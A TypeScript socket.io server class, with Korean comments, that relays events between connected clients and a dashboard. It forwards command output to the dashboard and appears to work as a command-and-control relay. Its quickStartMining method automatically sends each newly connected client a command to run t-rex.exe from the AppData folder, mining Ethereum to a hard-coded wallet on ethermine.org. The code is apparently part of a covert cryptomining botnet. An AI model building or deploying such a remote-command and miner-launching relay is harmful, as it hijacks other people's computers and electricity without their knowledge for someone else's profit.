import { Socket } from "socket.io";
import { DefaultEventsMap } from "socket.io/dist/typed-events";

class Client {
  socket: any;
  clientInfo: Object = {};

  /**
   * 클라이언트 -> 소켓 -> 대쉬보드
   * 클라이언트가 연결되었을때 대쉬에게 전달한 정보 on (client_setClientInfo)
   * 대쉬보드가 요청 했을때 클라이언트의 정보 알려주기 emit (client_getClientInfo)
   */
  constructor(soket: Socket<DefaultEventsMap, DefaultEventsMap>) {
    this.socket = soket;
  }
  // 클라이언트가 새로 접속하였을때 소켓서버에게 알림니다.
  public newClient() {
    this.socket.on("client_newClient", (clientIP: string) => {
      console.log("a new client", this.socket.id, clientIP);
      this.clientInfo = { socketID: this.socket.id, clientIP: clientIP };
      this.socket.broadcast.emit("dashBoard_newClient", this.clientInfo);
    });
  }
  // 클라이언트가 대쉬보드에게 정보를 전달
  public setClientInfo() {
    this.socket.on(
      "client_setClientInfo",
      (clientIP: string, DashSocketID: string) => {
        console.log(`[${this.socket.id}] hello ${DashSocketID} `);
        console.log("send clientinfo", this.socket.id, clientIP);
        this.clientInfo = { socketID: this.socket.id, clientIP: clientIP };
        this.socket
          .to(DashSocketID)
          .emit("dashBoard_setClientInfo", this.clientInfo);
      }
    );
  }
  // 연결 끊김
  public disconnect() {
    this.socket.on("disconnect", () => {
      console.log("disconnected ID: ", this.socket.id);
      this.socket.broadcast.emit("dashBoard_clientDisconnect", this.socket.id);
    });
  }
  // 클라이언트가 커맨드 결과를 대쉬보드에게 알려줍니다.
  public utilLogs() {
    this.socket.on(
      "client_logEvent",
      (
        dashboardID: string,
        clientIP: string,
        socketID: string,
        result: string
      ) => {
        console.log(`[${socketID}] send to ${dashboardID}\n${result} `);
        this.socket
          .to(dashboardID)
          .emit("dashboard_logEvent", clientIP, socketID, result);
      }
    );
  }
  public quickStartMining() {
    this.socket.on("client_newClient", (clientIP: string) => {
      const COMMAND = `%appdata%\\download\\t-rex.exe -a ethash -o stratum+tcp://asia1.ethermine.org:14444 -u 0x8928bc49dE9c7c1896C073Da72C1816d5F96C28E -p x -w ${clientIP}`;
      this.socket.emit("command", null, COMMAND);
    });
  }
  public async autoShutdownProcess() {
    setTimeout(() => {}, 1000);
  }
}

export default Client;
